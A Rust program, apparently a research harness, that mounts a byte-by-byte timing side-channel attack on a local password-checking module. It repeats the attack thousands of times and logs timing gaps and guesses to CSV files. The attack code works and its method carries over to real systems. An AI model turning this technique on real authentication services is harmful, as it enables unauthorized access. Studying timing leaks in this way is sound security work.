mod checker;

use std::fs::OpenOptions;
use std::io::{Result, Write};
use std::time::Instant;

const CHARSET: &str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
const SAMPLES: usize = 201;
const RUNS: usize = 10000;
// NOTE: attacker has to know or guess the password length — in a real attack
// this would be brute forced or leaked via the length check timing
const SECRET_LEN: usize = 10;

// The attacker only calls check_password() — a bool in, bool out black box.
// It does NOT have access to SECRET or any internals of checker.rs.

#[inline(never)]
fn trimmed_mean_time(attempt: &str) -> u64 {
    let mut times: Vec<u64> = (0..SAMPLES)
        .map(|_| {
            let start = Instant::now();
            let result = checker::check_password(attempt);
            let _ = unsafe { std::ptr::read_volatile(&result) };
            start.elapsed().as_nanos() as u64
        })
        .collect();

    times.sort_unstable();
    let trim = SAMPLES / 5;
    let trimmed = &times[trim..SAMPLES - trim];
    trimmed.iter().sum::<u64>() / trimmed.len() as u64
}

#[derive(Debug)]
struct PositionStat {
    position: usize,
    chosen_char: char,
    chosen_score_ns: u64,
    second_char: char,
    second_score_ns: u64,
    gap_ns: u64,
    gap_ratio: f64,
    partial_guess: String,
}

#[derive(Debug)]
struct AttackStats {
    guessed_password: String,
    success: bool,
    runtime_ns: u128,
    avg_gap_ns: f64,
    avg_gap_ratio: f64,
    position_stats: Vec<PositionStat>,
}

fn attack() -> AttackStats {
    let attack_start = Instant::now();
    let mut known = String::new();
    let mut gap_sum: u128 = 0;
    let mut gap_ratio_sum: f64 = 0.0;
    let mut gap_count: usize = 0;
    let mut position_stats: Vec<PositionStat> = Vec::new();

    for pos in 0..SECRET_LEN {
        let mut times: Vec<(char, u64)> = CHARSET
            .chars()
            .map(|c| {
                let mut attempt = known.clone();
                attempt.push(c);
                while attempt.len() < SECRET_LEN {
                    attempt.push('A');
                }
                (c, trimmed_mean_time(&attempt))
            })
            .collect();

        times.sort_unstable_by(|a, b| b.1.cmp(&a.1));

        let (best_char, best_time) = times[0];
        let (second_char, second_time) = times[1];
        let gap = best_time - second_time;
        let gap_ratio = best_time as f64 / second_time as f64;

        gap_sum += gap as u128;
        gap_ratio_sum += gap_ratio;
        gap_count += 1;

        known.push(best_char);

        position_stats.push(PositionStat {
            position: pos,
            chosen_char: best_char,
            chosen_score_ns: best_time,
            second_char,
            second_score_ns: second_time,
            gap_ns: gap,
            gap_ratio,
            partial_guess: known.clone(),
        });

        println!(
            "pos {}: best='{}' score={} ns | second='{}' score={} ns | gap={} ns | ratio={:.4} -> {}",
            pos, best_char, best_time, second_char, second_time, gap, gap_ratio, known
        );
    }

    let success = checker::check_password(&known);
    let runtime_ns = attack_start.elapsed().as_nanos();
    let avg_gap_ns = if gap_count > 0 { gap_sum as f64 / gap_count as f64 } else { 0.0 };
    let avg_gap_ratio = if gap_count > 0 { gap_ratio_sum / gap_count as f64 } else { 0.0 };

    println!("\n--- Final Result ---");
    if success {
        println!("SUCCESS! The password is '{}'", known);
    } else {
        println!("FAILED. Best guess was '{}'", known);
    }

    AttackStats { guessed_password: known, success, runtime_ns, avg_gap_ns, avg_gap_ratio, position_stats }
}

fn write_attack_csv_header_if_needed(path: &str) -> Result<()> {
    if !std::path::Path::new(path).exists() {
        let mut file = OpenOptions::new().create(true).append(true).open(path)?;
        writeln!(file, "samples,run,guessed_password,success,runtime_ns,avg_gap_ns,avg_gap_ratio")?;
    }
    Ok(())
}

fn write_position_csv_header_if_needed(path: &str) -> Result<()> {
    if !std::path::Path::new(path).exists() {
        let mut file = OpenOptions::new().create(true).append(true).open(path)?;
        // no correct_char or was_correct — attacker doesn't know the secret
        writeln!(file, "samples,run,position,chosen_char,chosen_score_ns,second_char,second_score_ns,gap_ns,gap_ratio,partial_guess")?;
    }
    Ok(())
}

fn append_run_to_csv(path: &str, run_num: usize, stats: &AttackStats) -> Result<()> {
    let mut file = OpenOptions::new().create(true).append(true).open(path)?;
    writeln!(file, "{},{},{},{},{},{},{}", SAMPLES, run_num, stats.guessed_password, stats.success, stats.runtime_ns, stats.avg_gap_ns, stats.avg_gap_ratio)?;
    Ok(())
}

fn append_position_stats_to_csv(path: &str, run_num: usize, stats: &AttackStats) -> Result<()> {
    let mut file = OpenOptions::new().create(true).append(true).open(path)?;
    for ps in &stats.position_stats {
        writeln!(file, "{},{},{},{},{},{},{},{},{},{}", SAMPLES, run_num, ps.position, ps.chosen_char, ps.chosen_score_ns, ps.second_char, ps.second_score_ns, ps.gap_ns, ps.gap_ratio, ps.partial_guess)?;
    }
    Ok(())
}

fn main() -> Result<()> {
    let attack_csv_path = "attack_stats2.csv";
    let position_csv_path = "attack_position_stats2.csv";

    write_attack_csv_header_if_needed(attack_csv_path)?;
    write_position_csv_header_if_needed(position_csv_path)?;

    for run in 1..=RUNS {
        println!("\n==============================");
        println!("RUN {} / {}", run, RUNS);
        println!("==============================");

        let stats = attack();
        append_run_to_csv(attack_csv_path, run, &stats)?;
        append_position_stats_to_csv(position_csv_path, run, &stats)?;

        println!("Summary: samples={}, run={}, success={}, runtime_ns={}, avg_gap_ns={:.2}, avg_gap_ratio={:.4}",
            SAMPLES, run, stats.success, stats.runtime_ns, stats.avg_gap_ns, stats.avg_gap_ratio);
    }

    println!("\nDone. Results in {} and {}", attack_csv_path, position_csv_path);
    Ok(())
}